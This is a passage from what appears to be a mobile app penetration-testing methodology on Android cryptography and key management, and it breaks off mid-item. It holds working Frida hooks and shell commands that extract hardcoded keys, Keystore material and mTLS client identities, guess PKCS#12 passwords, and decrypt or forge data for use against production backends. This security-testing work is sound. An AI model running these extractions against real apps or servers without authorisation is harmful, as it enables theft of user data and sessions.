# D12 · Cryptography & Key Management

> This domain is where a public artefact — the APK anyone can download — hands you a key, a nonce or a
> signature that the backend still trusts. Its crypto-native ceiling is only **P2**
> (`cryptographic_weakness.key_reuse.inter_environment`); everything else in the `cryptographic_weakness`
> branch tops out at P3/P4/P5, so a report that stays inside that branch is capped by construction. The
> real ceiling is reached by *leaving* the branch: an extracted key that opens a backend asset is
> `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1), and a crypto break
> that yields a session is `broken_authentication_and_session_management.authentication_bypass` (P1).
> Write every item towards that exit.

| | |
|---|---|
| **Phases** | P3 crypto call-site inventory, **P4 static (transformation census, key provenance, `KeyGenParameterSpec` audit)**, P5 runtime (Cipher/Keystore hooks, auth-window differential, oracle reachability), P6 backend (signature enforcement, attestation verification) |
| **Milestones** | **M4**, with M3 feeding the inventory and M5 carrying the Keystore-oracle and attestation work |
| **VRT ceiling** | Crypto-native best: `cryptographic_weakness.key_reuse.inter_environment` (**P2**, CWE-323). Real ceiling by exit: `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) when the recovered key opens a backend asset holding customer data; `broken_authentication_and_session_management.authentication_bypass` (**P1**) when the break yields a session; `insecure_os_firmware.hardcoded_password.privileged_user` (**P1**) / `.non_privileged_user` (**P2**) for an embedded credential. Branch caps you must not fight: `broken_cryptography.use_of_broken_cryptographic_primitive` P3, `insecure_key_generation.insufficient_key_space` P3, `insufficient_entropy.predictable_prng_seed` / `.predictable_initialization_vector` / `.small_seed_space_in_prng` / `.limited_rng_entropy_source` P4, `side_channel_attack.padding_oracle_attack` / `.timing_attack` P4, `broken_cryptography.use_of_vulnerable_cryptographic_library` P4, `use_of_expired_cryptographic_key_or_cert` P4, `key_reuse.lack_of_perfect_forward_secrecy` P4, `insufficient_verification_of_data_authenticity.identity_check_value` P4. P5 dead ends: `insufficient_entropy.initialization_vector_reuse`, `.prng_seed_reuse`, `.use_of_trng_for_nonsecurity_purpose`, `key_reuse.intra_environment`, `incomplete_cleanup_of_keying_material`, `weak_hash.use_of_predictable_salt`, `sensitive_data_exposure.sensitive_data_hardcoded.oauth_secret`, `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid`. Rated-by-impact (null): `insecure_implementation.missing_cryptographic_step`, `insecure_implementation.improper_following_of_specification`, `insufficient_verification_of_data_authenticity.cryptographic_signature`, `insecure_key_generation.insufficient_key_stretching`, `weak_hash.lack_of_salt`, `weak_hash.predictable_hash_collision`, `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` |
| **Primary attacker model** | **AM-01** remote no interaction — the key comes out of a public APK and is then used against the backend with no victim involved. Secondary: **AM-03** zero-permission local app (Keystore-as-oracle via an exported surface), **AM-08** malicious third-party SDK (in-process key use), **AM-11** physical unlocked (biometric-bound key abuse), **AM-10** physical locked (`setUnlockedDeviceRequired` absent). **AM-12 own rooted device is the extraction harness, not the attack** — never let a report rest on it |
| **Maps to** | MASVS-CRYPTO-1, MASVS-CRYPTO-2, MASVS-STORAGE-1, MASVS-AUTH-2; MASTG-TEST-0204, -0205, -0208, -0212, -0221, -0232, -0307, -0308, -0312, -0330, -0350; MASTG-KNOW-0011, -0012, -0013, -0043, -0047; MASTG-BEST-0001, -0005, -0009, -0020; MASWE-0003, -0004, -0007, -0008, -0009, -0012, -0013, -0014, -0016, -0020, -0022, -0023, -0047; MASTG-TOOL-0032 (Frida CodeShare), -0110, -0116 (blutter), -0125 (apkleaks), -0144 (gitleaks); MASTG-TECH-0033, -0043; LEGACY MSTG-CRYPTO-1/-2/-4/-6, MSTG-STORAGE-1; CWE-208, 259, 284, 306, 312, 318, 321, 323, 325, 326, 327, 328, 329, 330, 331, 332, 334, 336, 337, 338, 339, 340, 347, 354, 459, 522, 649, 759, 760, 780, 798, 807, 916, 1204; ATT&CK T1406, T1521, T1521.001, T1521.002, T1533, T1617, T1635, T1641.001, T1474.001, T1426; NIST SP 800-38A, SP 800-57 Pt1 Rev5 §5.2, SP 800-67 r2, SP 800-132, SP 800-224, SP 800-131A Rev2, NIST IR 8459, RFC 7465, RFC 6151, RFC 8252 |

## Why this domain pays

It pays because the entry ticket is free. Every other domain needs a victim, a link, a permission or a
malicious app on the device; this one needs the Play Store. A hardcoded `SecretKeySpec` is a shared secret
with the entire install base the moment the build ships, and the same is true of an HS256 signing secret, an
mTLS client `.p12`, a Dart-embedded AES seed in `libapp.so`, or an Algolia admin key in a Hermes bundle.
Bugcrowd's own doctrine agrees with the shape: `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset`
is **P1**, and a shipped APK is a publicly accessible asset. The IQCrafter Flutter study pulled two complete
2048-bit RSA private keys out of `libapp.so` at offsets `0x85bb0` and `0x9f486` and then produced
byte-identical request signatures from a standalone Python client — that is a P1-shaped finding that never
touched a user.

It also fails more often than any other domain, and it fails for one reason: the grep hit gets submitted
instead of the consequence. The calibration points are unambiguous. ivrodriguez's first-ever mobile report
was a detailed, *correct* write-up of UUID-as-key-and-salt reuse with no authentication tag — closed **Not
applicable** with the triager asking "Can you show a proof of concept on how you can exploit this issue?"
Meesho used `AES/ECB` with a key equal to the first 16 characters of the access token and no IV or MAC — and
it was still only **Low**, because the payloads were short identifiers, over TLS, under a key the server
already shared. Google's Mobile VRP lists "Hardcoded API keys" as flatly non-qualifying; Xiaomi, Spotify,
Grab, Reddit and Basecamp all exclude recoverable app secrets by name, and Basecamp's exclusion carries the
exact escape hatch you must aim for: *"unless chained with a demonstrated cross-user impact that does not
require physical device access."* Empirically, Reverb.com's hardcoded Cloudinary API-secret report paid **$0**
at 96 upvotes; Zenly's overly-permissive-key report paid $750; 8x8 and Nord Security hardcoded-key reports
paid $0. Compare that to Nextcloud #1189162 (E2EE public key *not verified*) at **$1,500** against #1189168
(E2EE keys not cleared on logout) at **$100** — the verification failure was worth fifteen times the hygiene
failure. The base rate for "I found a key" is high; the base rate for "I found a key that is worth money" is
low, and the gap is entirely the decryption or the forgery you did with it.

The third reason to take this domain seriously is that it is the single most common source of *fabricated*
findings in mobile reporting. Three emulator artefacts — `KeyInfo.isInsideSecureHardware() == false`,
`getSecurityLevel() == 0`, and auth-bound key generation throwing on a device with no lockscreen — are
properties of your harness, not of the app, and reporting them is the fastest way to have a report closed as
informative and your subsequent submissions read with suspicion. The emulator is authoritative for almost
all crypto *misuse* (algorithm, mode, IV, key provenance, purpose bitmask, PRNG); it is authoritative for
nothing about hardware backing, attestation chains, StrongBox or real biometric enrolment. Decide which side
of that line each item sits on before you run it, and say so in the report.

## The crux question

**Is there a key, nonce, salt or signature that some component still trusts, which I can reproduce either
from the public APK or from code running in the app's own UID — and what does the server do when I use it?**

## Triage order

1. **The transformation and key-provenance census** (D12-001, D12-002). One `Cipher.getInstance` frequency
   table and one `SecretKeySpec` hook answer most of the domain in ten minutes, and the hook beats every
   obfuscator because the key must exist in the clear at construction.
2. **Framework check before any negative** (D12-003). On React Native, Flutter, Cordova or Unity a clean
   `jadx/sources` crypto grep is a *false negative*, not a result. Dump the bundle or the native blob first.
3. **Key provenance, hardest first** (D12-005 → D12-013). Hardcoded constant → shipped key file → native
   blob → device-identifier derivation → outside-the-Keystore storage. Stop at the first one that decrypts
   real data; that is the report.
4. **What the key protects, and whether the server trusts it** (D12-041, D12-042, D12-043). A key that only
   obfuscates local config is Low; the same key signing requests is where P1 lives. Test the *server*, not
   the client.
5. **The Keystore audit** (D12-004, then D12-048 → D12-061). Read `KeyGenParameterSpec` for every alias and
   decide, per key, whether hardware backing is protecting *extraction* while leaving *use* wide open.
6. **Randomness at a security sink only** (D12-033 → D12-038). Follow each `Random` hit forward with jadx
   xrefs; a `Random` that shuffles a carousel is not a finding and filing it costs you credibility.
7. **Attestation, if the app uses it at all** (D12-062 → D12-069). This is server-side work with the highest
   ceiling in the chapter after key extraction, and almost nobody tests it.
8. **Everything that is P5 on its own goes last** (IV reuse alone, intra-environment key reuse, predictable
   salt, uncleared keying material). File them as chain fuel under a parent finding or leave them in the
   Graveyard.

## Items

### D12-001 · Build the transformation and key-provenance census before judging anything

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (method — feeds every item below) |
| **Attacker** | AM-12 (harness) |
| **Applies to** | all |
| **Maps to** | MASTG-KNOW-0011, MASTG-KNOW-0012, MASTG-KNOW-0013 |

- **Test:** Produce one frequency-ordered table of every cipher transformation, every digest, every key
  construction and every randomness source in the app, so that later items are judged against the app's
  actual crypto rather than against whatever grep hit first.
- **How:**
```bash
J=out/sources
# 1. transformation census, frequency ordered — the single most informative artefact in the domain
grep -rhoE 'Cipher\.getInstance\("[^"]+"' $J | sort | uniq -c | sort -rn
grep -rhoE 'MessageDigest\.getInstance\("[^"]+"' $J | sort | uniq -c | sort -rn
grep -rhoE 'Mac\.getInstance\("[^"]+"' $J | sort | uniq -c | sort -rn
grep -rhoE 'Signature\.getInstance\("[^"]+"' $J | sort | uniq -c | sort -rn
grep -rhoE 'SecretKeyFactory\.getInstance\("[^"]+"' $J | sort | uniq -c | sort -rn
# 2. key construction sites with context
grep -rnE 'new SecretKeySpec\(|new IvParameterSpec\(|new GCMParameterSpec\(|new PBEKeySpec\(|KeyGenParameterSpec\.Builder\(|KeyGenerator\.getInstance\(|KeyPairGenerator\.getInstance\(' $J
# 3. randomness sources
grep -rnE 'new Random\(|Math\.random\(|java\.util\.Random|SecureRandom|setSeed\(|currentTimeMillis\(\)|nanoTime\(\)' $J
# 4. the smali cross-check (catches what jadx failed to decompile)
grep -rnE 'Ljavax/crypto/Cipher;->getInstance|Ljavax/crypto/spec/SecretKeySpec;-><init>|Ljava/security/MessageDigest;->getInstance' out/smali/ | wc -l
```
  Run the MASTG semgrep rule pack over the same tree so the static result is citable:
```bash
semgrep -c rules/mastg-android-broken-encryption-algorithms.yaml \
        -c rules/mastg-android-broken-encryption-modes.yaml \
        -c rules/mastg-android-hardcoded-crypto-keys-usage.yml \
        -c rules/mastg-android-random-apis-insufficient-entropy.yml \
        -c rules/mastg-android-non-random-use.yml \
        -c rules/mastg-android-key-generation-with-insufficient-key-length.yml \
        -c rules/mastg-android-asymmetric-key-pair-used-for-multiple-purposes.yml \
        -c rules/mastg-android-hardcoded-security-provider.yaml $J
mobsfscan --json -o mobsfscan.json $J
```
- **Proof:** A table of transformations with counts and file:line anchors, plus a count of smali crypto
  call sites that matches the jadx count within a few percent. A large smali/jadx delta means decompilation
  failed on crypto classes and every negative below is provisional.
- **Escalation:** This is the map. Every other item in this chapter cites a row from it.
- **Ruled out when:** The census returns zero `Cipher`, `Mac`, `Signature`, `MessageDigest` and
  `KeyGenParameterSpec` call sites in first-party packages **and** the smali cross-check agrees **and**
  D12-003 confirms the app is not RN/Flutter/Cordova/Unity. Then the app performs no first-party
  cryptography and this domain is genuinely empty — record the counts.

### D12-002 · Universal runtime key and plaintext capture at `SecretKeySpec` / `Cipher`

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (method) |
| **Attacker** | AM-12 (harness) |
| **Applies to** | all Java/Kotlin crypto; native crypto needs `Interceptor.attach` instead |
| **Maps to** | MASTG-TOOL-0032, MASTG-TECH-0033, MASTG-TECH-0043; Frida CodeShare `@fadeevab/intercept-android-apk-crypto-operations`, `@dzonerzy/aesinfo` |

- **Test:** Do not reverse the key derivation. The key must exist in the clear at `SecretKeySpec.<init>`
  and the plaintext must exist in the clear at `Cipher.doFinal`, whatever the obfuscator did. Capture both.
- **How:**
```javascript
// crypto.js — covers all overloads, not just the single-argument ones
Java.perform(function () {
  function hex(b){ return Array.from(b).map(function(x){return ('0'+(x&0xff).toString(16)).slice(-2);}).join(''); }
  function asc(b){ return Array.from(b).map(function(x){return String.fromCharCode(x&0xff);}).join(''); }
  var ST = function(){ return Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()); };

  Java.use('javax.crypto.spec.SecretKeySpec').$init.overload('[B','java.lang.String')
    .implementation = function (k, a) {
      console.log('[KEY] alg=' + a + ' len=' + k.length + ' hex=' + hex(k) + ' ascii=' + asc(k) + '\n' + ST());
      return this.$init(k, a); };

  Java.use('javax.crypto.spec.IvParameterSpec').$init.overload('[B')
    .implementation = function (iv) { console.log('[IV] ' + hex(iv)); return this.$init(iv); };

  var G = Java.use('javax.crypto.spec.GCMParameterSpec');
  G.$init.overload('int','[B').implementation = function (t, iv) {
    console.log('[GCM] tagBits=' + t + ' ivLen=' + iv.length + ' iv=' + hex(iv)); return this.$init(t, iv); };

  var C = Java.use('javax.crypto.Cipher');
  C.getInstance.overload('java.lang.String').implementation = function (t) {
    console.log('[CIPHER] ' + t + '\n' + ST()); return this.getInstance(t); };
  C.doFinal.overloads.forEach(function (o) {
    o.implementation = function () {
      var r = o.apply(this, arguments);
      try { console.log('[DOFINAL ' + this.getAlgorithm() + '] out=' + asc(r)); } catch (e) {}
      return r; }; });
  C.update.overloads.forEach(function (o) {
    o.implementation = function () { console.log('[UPDATE ' + this.getAlgorithm() + ']'); return o.apply(this, arguments); }; });
});
```
```bash
frida -U -f com.target.app -l crypto.js --no-pause
# broad trace first if you do not know where to look
frida-trace -U -f com.target.app -j 'javax.crypto.*!*' -j 'java.security.*!*' -o crypto.log
```
- **Proof:** A `[KEY]` line with the hex bytes and a `[CIPHER]` line naming the transformation, followed by
  a `[DOFINAL]` line showing the corresponding plaintext. The MHL-captured shape is the target:
  `Algorithm: AES/ECB/PKCS5Padding`, `Key: 4d6f62696c65486173682e2e2e`, `Input: {"user":"admin","pin":"1234"}` —
  two findings (recovered key, ECB mode) out of one trace.
- **Escalation:** The key feeds D12-005; the plaintext feeds D11 (decrypt the local store) and D15 (forge
  the request body). A recovered request-signing key is the highest-value exit from this item.
- **Ruled out when:** Hooks are installed (prove it with a control line printed at attach) and exercising
  every crypto-touching flow produces no `[KEY]`/`[CIPHER]` output — the crypto is native. Move to
  `Interceptor.attach` on `EVP_*`/`AES_*` exports in the app's `.so` (D16/D26). "I ran the script and saw
  nothing" without a control line is not a negative.

### D12-003 · A clean Java crypto grep on RN / Flutter / Cordova / Unity is a FALSE NEGATIVE

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (method — prevents a wrong negative) |
| **Attacker** | AM-12 (harness) |
| **Applies to** | React Native, Flutter, Cordova/Ionic/Capacitor, Unity, Xamarin/MAUI, KMP |
| **Maps to** | MASTG-TOOL-0116 (blutter), MASTG-TOOL-0125 (apkleaks), MASTG-TOOL-0144 (gitleaks) |

- **Test:** On cross-platform builds the key derivation, the storage-key names and the transformation live
  in `assets/index.android.bundle` (or the OTA bundle), `libapp.so`, `libil2cpp.so` or the managed
  assemblies — never in `jadx/sources`. Establish the framework before recording any crypto negative.
- **How:**
```bash
unzip -l base.apk | grep -iE 'index.android.bundle|libhermes|libapp\.so|libflutter\.so|libil2cpp\.so|assemblies|global-metadata|www/|cordova'
# React Native / Hermes
hbctool disasm assets/index.android.bundle hbc_out 2>/dev/null || strings -n 6 assets/index.android.bundle > hbc.strings
grep -aiE 'SecureStore|AsyncStorage|keychain|accessToken|refresh|biometric|mmkv|encrypt|aes|hmac|secret' hbc.strings | head -40
# Flutter
python3 blutter.py ext/lib/arm64-v8a out_dir && grep -nE 'aes|sha256|hmac|encrypt|IV|salt|Cipher' out_dir/pp.txt | head -40
strings -n 20 ext/lib/arm64-v8a/libapp.so | grep -a -- '-----BEGIN'
# Unity / Xamarin
grep -nE 'Aes|Rijndael|TripleDES|MD5|SHA1|Rfc2898DeriveBytes|new byte\[\]|Convert\.FromBase64String' out/dump.cs | head -40
ilspycmd out/assemblies/out/App.dll | grep -nE 'Aes|key|IV|Rfc2898' | head -40
```
- **Proof:** Storage-key names, route strings or crypto identifiers recovered from the bundle/native string
  table that do not appear anywhere in `jadx/sources` — one Hermes v96 bundle yielded 545k strings including
  every route, endpoint and storage key.
- **Escalation:** Whatever you find routes to D12-009 (Flutter Smi keys), D12-010 (managed code),
  D12-011 (bundle keys) and D19.
- **Ruled out when:** The APK contains none of the framework markers above (no `index.android.bundle`, no
  `libapp.so`/`libflutter.so`, no `libil2cpp.so`/`global-metadata.dat`, no `assemblies/`, no `www/`), so the
  DEX is the whole app and a DEX-only negative is sound.

### D12-004 · Enumerate the Keystore at runtime and read every key's real `KeyInfo`

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (method — the measurement behind D12-048 → D12-061) |
| **Attacker** | AM-12 (harness) |
| **Applies to** | API 23+ for `KeyInfo`/`KeyGenParameterSpec`; `getSecurityLevel()` API 31+ |
| **Maps to** | MASTG-KNOW-0043 (Android KeyStore), MASTG-KNOW-0047, MASTG-TEST-0330; objection `android keystore list` / `detail` / `watch` |

- **Test:** "We use the Android Keystore" is a claim. This is the measurement: which aliases exist, what
  each one is for, and what its authorisation constraints actually are.
- **How:**
```bash
objection -g com.target.app explore -s "android keystore list"
objection -g com.target.app explore -s "android keystore detail --json"   # getKeySize, getKeyValidityForConsumptionEnd,
                                                                          # getKeyValidityForOriginationEnd, getKeyValidityStart,
                                                                          # getKeystoreAlias, isInsideSecureHardware
objection -g com.target.app explore -s "android keystore watch"           # hooks KeyStore.getKey and KeyStore.load
```
```javascript
// keyinfo.js — the full property read, including the API 31+ security level
Java.perform(function () {
  var KS = Java.use('java.security.KeyStore'), KF = Java.use('java.security.KeyFactory'),
      SKF = Java.use('javax.crypto.SecretKeyFactory'), KeyInfo = Java.use('android.security.keystore.KeyInfo');
  var ks = KS.getInstance('AndroidKeyStore'); ks.load(null);
  var it = ks.aliases();
  while (it.hasMoreElements()) {
    var a = it.nextElement(); 
    try {
      var k = ks.getKey(a, null), info;
      try { info = Java.cast(KF.getInstance(k.getAlgorithm(),'AndroidKeyStore').getKeySpec(k, KeyInfo.class), KeyInfo); }
      catch (e) { info = Java.cast(SKF.getInstance(k.getAlgorithm(),'AndroidKeyStore').getKeySpec(k, KeyInfo.class), KeyInfo); }
      var line = a + ' | size=' + info.getKeySize() +
        ' | userAuthRequired=' + info.isUserAuthenticationRequired() +
        ' | authTimeout=' + info.getUserAuthenticationValidityDurationSeconds() +
        ' | authHWEnforced=' + info.isUserAuthenticationRequirementEnforcedBySecureHardware() +
        ' | randomizedEnc=' + info.isRandomizedEncryptionRequired() +
        ' | purposes=' + info.getPurposes() +
        ' | blockModes=' + info.getBlockModes() + ' | paddings=' + info.getEncryptionPaddings();
      try { line += ' | secureHW=' + info.isInsideSecureHardware(); } catch (e) {}
      try { line += ' | securityLevel=' + info.getSecurityLevel(); } catch (e) {}   // API 31+
      try { line += ' | unlockedDeviceRequired=' + info.isUnlockedDeviceRequired(); } catch (e) {}
      console.log(line);
    } catch (e) { console.log(a + ' | ERR ' + e); }
  }
});
```
  Static counterpart, so the two can be reconciled:
```bash
grep -rn -A25 'KeyGenParameterSpec\.Builder' out/sources/ | \
  grep -E 'setUserAuthenticationRequired|setUserAuthenticationParameters|setUserAuthenticationValidityDurationSeconds|setInvalidatedByBiometricEnrollment|setUnlockedDeviceRequired|setIsStrongBoxBacked|setRandomizedEncryptionRequired|setBlockModes|setEncryptionPaddings|setKeySize|setAttestationChallenge|PURPOSE_'
```
- **Proof:** A per-alias table with the eight properties above, reconciled against the
  `KeyGenParameterSpec.Builder` chain in the decompile, and each alias mapped to the secret it protects via
  the `android keystore watch` / `KeyStore.getKey` hook firing immediately before a `Cipher.doFinal`.
- **Escalation:** Every Keystore item below cites a row from this table.
- **Ruled out when:** `aliases()` returns empty after exercising every crypto-touching flow **and** the
  static grep finds no `KeyGenParameterSpec`/`AndroidKeyStore` reference — the app does not use the
  Keystore at all, which is itself the D12-013 finding, not a clean bill of health.

### D12-005 · Hardcoded symmetric key reaching `SecretKeySpec`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the key opens a backend asset; `insecure_os_firmware.hardcoded_password.non_privileged_user` (P2) for the embedded credential itself; `cryptographic_weakness.insecure_key_generation.insufficient_key_space` (P3) as the crypto-native fallback |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0212, MASWE-0003, MASWE-0004, MASTG-KNOW-0012, rule `mastg-android-hardcoded-crypto-keys-usage`, CWE-312/318/321/798, ATT&CK T1406/T1521.001 |

- **Test:** A key that is a compile-time constant is shared with every user and every attacker. The finding
  is not the constant; it is the ciphertext you decrypt with it.
- **How:**
```bash
semgrep -c rules/mastg-android-hardcoded-crypto-keys-usage.yml out/sources/
# the MASTG rule shape: SecretKeySpec $_ = new SecretKeySpec($KEY, $ALGO);  and  byte[] $KEY = {...}; ... new SecretKeySpec($KEY, $ALGO);
grep -rnE 'new SecretKeySpec\(|SecretKeySpec\(\s*"|\.getBytes\(\s*"?(UTF-8|utf-8)?"?\s*\)' out/sources/ -B8 -A4
grep -rnE 'new byte\[\] *\{ *(\(byte\) *)?(0x[0-9a-fA-F]{2}, *){7,}' out/sources/
grep -rn --include='*.xml' -oE '[A-Za-z0-9+/]{24,}={0,2}' out/res/values/strings.xml
strings classes*.dex | grep -E '^[A-Za-z0-9+/]{16,}={0,2}$' | head
rabin2 -zz lib/arm64-v8a/*.so | grep -iE 'key|secret|passphrase'
gitleaks detect --no-git --source ./out/
apkleaks -f base.apk
```
  Confirm at runtime with D12-002, then decrypt off-device:
```bash
adb shell run-as com.target.app cat shared_prefs/secure.xml | grep -oE '[A-Za-z0-9+/]{24,}={0,2}' | head -1 | base64 -d > blob.bin
openssl enc -d -aes-256-cbc -K <hexkey> -iv <hexiv> -in blob.bin | xxd | head
openssl enc -d -aes-128-ecb -K <hexkey> -in blob.bin | strings | head
```
- **Proof:** The plaintext. A ciphertext taken off the device (or off the wire) decrypting to readable JSON
  containing the user's token or PII, using only material extracted from the public APK — with the openssl
  command line in the report so a triager can repeat it.
- **Escalation:** → D11 (the "encrypted at rest" mitigation the vendor claims for the storage finding is
  void — file both together, storage as the consumer); → D15 (forge a signed request body); → D13 (the
  decrypted value is a session); → D17 if the key protects an update manifest.
- **Ruled out when:** Every `SecretKeySpec` argument traces (by jadx xref) to either a `KeyGenerator`
  seeded by unseeded `SecureRandom`, a `SecretKeyFactory` PBKDF over a per-user random salt, or an
  `AndroidKeyStore` alias — and the D12-002 hook confirms the runtime key bytes differ between two clean
  installs on two devices. Differing bytes across installs is the true negative; a constant you could not
  find is not.

### D12-006 · Private key, PKCS#12, JKS/BKS or service-account file shipped in the package

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a cloud service-account or an mTLS client identity; `insecure_os_firmware.hardcoded_password.privileged_user` (P1) if the store password grants privileged access |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | ATT&CK T1474.001, T1635, T1521.002; MASWE-0004; CWE-798 |

- **Test:** Anything shipped to every user is public. A client certificate, a PKCS#12 bundle, a keystore
  file or a cloud credentials JSON in the APK is a backend credential with a distribution channel.
- **How:**
```bash
unzip -l base.apk | grep -iE '\.p12$|\.pfx$|\.jks$|\.bks$|\.key$|\.pem$|\.keystore$|service-account|credentials\.json|\.der$'
unzip -p base.apk res/raw/client.p12 > client.p12
for pw in "" changeit password android "$(grep -rhoE 'char\[\] *\{[^}]*\}|"[A-Za-z0-9_!@#-]{6,32}"' out/sources/ | head -50)"; do
  openssl pkcs12 -info -nodes -in client.p12 -passin pass:"$pw" >/dev/null 2>&1 && echo "PASSWORD: [$pw]" && break
done
grep -rnE 'keyStore\.load\(|KeyStore\.getInstance\("(BKS|PKCS12|JKS)"\)|char\[\] *(password|storePassword)|\.toCharArray\(\)' out/sources/
# prove reach
openssl pkcs12 -in client.p12 -out client.pem -nodes -passin pass:<pw>
curl -v --cert client.pem https://mtls.api.target/v1/whoami
```
- **Proof:** The private key extracted (usually with a password that is itself in the DEX), and a completed
  TLS handshake to the client's production API from `curl` returning authenticated data — or, for a service
  account, `gcloud auth activate-service-account` followed by a listing of a bucket you should not reach.
- **Escalation:** → D18 (cloud backend) for a service account; → D15 with the "device-authenticated"
  endpoints unlocked for an mTLS identity; → D14 if it is a pinning trust store (that is a pinning-bypass
  aid, not this finding).
- **Ruled out when:** The only key-shaped files in the package are public certificates (`openssl x509`
  parses them; `openssl pkcs12 -info` reports no private key) used for pinning or for verifying a server
  signature. A public key in an APK is expected; only a private key or a symmetric store is this finding.

### D12-007 · mTLS client identity recovered from the live PKCS#12 reload

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) if the certificate alone authenticates; otherwise `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) |
| **Attacker** | AM-11 / AM-08 (in-process), then AM-01 with the extracted identity |
| **Applies to** | apps doing PKCS#12-backed mTLS with a runtime-derived store password |
| **Maps to** | HackTricks `android-anti-instrumentation-and-ssl-pinning-bypass.md` — mTLS client certificate extraction from live keystore reloads |

- **Test:** The common pattern — generate a keypair, store the key and the issued client certificate in a
  PKCS#12 with a runtime-derived password, reload on every request to build a `KeyManager` — makes the
  password strong at rest and useless at runtime, because the app must call `KeyStore.load`,
  `getCertificate(alias)` and `getKey(alias, password)` in its own process.
- **How:** Hook the constructor or method that receives the **decrypted** `KeyStore`, alias and password —
  usually a custom `KeyManager` wrapper:
```javascript
Java.perform(function () {
  var CKM = Java.use('com.target.app.net.ClientKeyManager');
  var B64 = Java.use('android.util.Base64');
  var X509 = Java.use('java.security.cert.X509Certificate');
  CKM.$init.implementation = function (ks, alias, password) {
    this.$init(ks, alias, password);
    var cert = Java.cast(ks.getCertificate(alias), X509);
    var key  = ks.getKey(alias, password);
    var raw  = key.getEncoded();
    console.log('alias=' + alias + ' password=' + password);
    console.log('CERT=' + B64.encodeToString(cert.getEncoded(), 0));
    console.log('KEY='  + (raw ? B64.encodeToString(raw, 0) : 'null (TEE-backed)'));
  };
});
```
```bash
openssl pkcs12 -export -out client-cert.pfx -inkey privateKey.key -in cert.pem   # then load into Burp
```
- **Proof:** Burp (or `curl --cert`) completing the mTLS handshake with the extracted identity and reaching
  a protected API endpoint that refuses a connection without it.
- **Escalation:** → D14 (the transport control is gone) → D15 (the whole mTLS-protected API is now testable
  and abusable from outside the app).
- **Ruled out when:** `key.getEncoded()` returns `null` — the private key is `AndroidKeyStore`/TEE-backed
  and cannot be exported, so only the certificate comes out. Record that difference explicitly: it is the
  correct implementation and worth stating as a positive.

### D12-008 · PEM private key or HMAC seed inside `libapp.so` / `libil2cpp.so` / managed assemblies

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Flutter, Unity IL2CPP, Xamarin/MAUI, any framework with a native blob |
| **Maps to** | IQCrafter Flutter study (RSA keys recovered at `0x85bb0` and `0x9f486` in `libapp.so`, end-to-end signature replay against production) |

- **Test:** DEX-oriented secret scanners never look in the native blob. Sweep it statically and then at
  runtime, because keys are often assembled at init rather than stored whole.
- **How:**
```bash
strings -n 20 ext/lib/arm64-v8a/libapp.so    | grep -a -n -- '-----BEGIN'
strings -n 20 ext/lib/arm64-v8a/libil2cpp.so | grep -a -n -- '-----BEGIN'
grep -rna -- '-----BEGIN' out/assemblies/out/*.dll
grep -a -n -- '-----BEGIN' out_dir/pp.txt      # blutter object-pool dump
```
```bash
frida -U -f com.target.app -q -e "
var m = Process.getModuleByName('libapp.so');
// '-----BEGIN'
Memory.scan(m.base, m.size, '2d 2d 2d 2d 2d 42 45 47 49 4e', {
  onMatch: function(a){ console.log(a, Memory.readUtf8String(a, 96)); }, onComplete: function(){}});
// '/api/'
Memory.scan(m.base, m.size, '2f 61 70 69 2f', {
  onMatch: function(a){ console.log('api', a, Memory.readUtf8String(a, 80)); }, onComplete: function(){}});
"
```
- **Proof:** A complete PEM private key extracted at a named offset, and a signature produced offline with
  it that the production API accepts (HTTP 200) — the signature replay is the finding, the PEM is the
  evidence.
- **Escalation:** → D12-041/D12-043 (forge `X-Nonce`/`X-Timestamp`/`X-Signature` headers) → full D15 API
  access without the app at all.
- **Ruled out when:** The `Memory.scan` runs over the loaded module after the app has exercised its signing
  path (prove the module was loaded and the scan completed) and finds no key material, and the static
  `strings` sweep of every `.so` and every assembly is clean. Note the module base and size in the record.

### D12-009 · Flutter: reconstruct a Dart-embedded key from Smi-encoded constants

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the key protects user data across the install base |
| **Attacker** | AM-01 |
| **Applies to** | Flutter release builds — **including `--obfuscate`, which does not touch constants** |
| **Maps to** | reversethat.app DroidPass analysis; MASTG-TOOL-0116 (blutter) |

- **Test:** Dart AOT stores small integer constants tagged (Smi): `actual = raw >> 1`. A key built
  character-by-character from immediates looks like meaningless numbers in a decompiler and decodes
  trivially.
- **How:**
```bash
python3 blutter.py ext/lib/arm64-v8a out_dir
grep -nE 'LoadImmediate|#0x[0-9a-f]{2}\b' out_dir/asm/*.txt | head -60
python3 - <<'PY'
raw = [0x82,0xE4,0xBA]          # the immediates in constructor order
print(''.join(chr(b >> 1) for b in raw))
PY
grep -nE 'fromCharCodes|sha256|utf8|IV_SALT|AES|CBC|PKCS7|GCM' out_dir/asm/*.txt out_dir/pp.txt | head
```
  Then reproduce the derivation off-device — the DroidPass shape was SHA-256(key) as the AES-256 key and
  SHA-256(key + `"IV_SALT"`)[:16] as the CBC IV, with AES-CBC/PKCS#7 confirmed from the object-pool mode
  and padding identifiers.
- **Proof:** The decoded immediates yield a printable key string, and decrypting the app's on-device
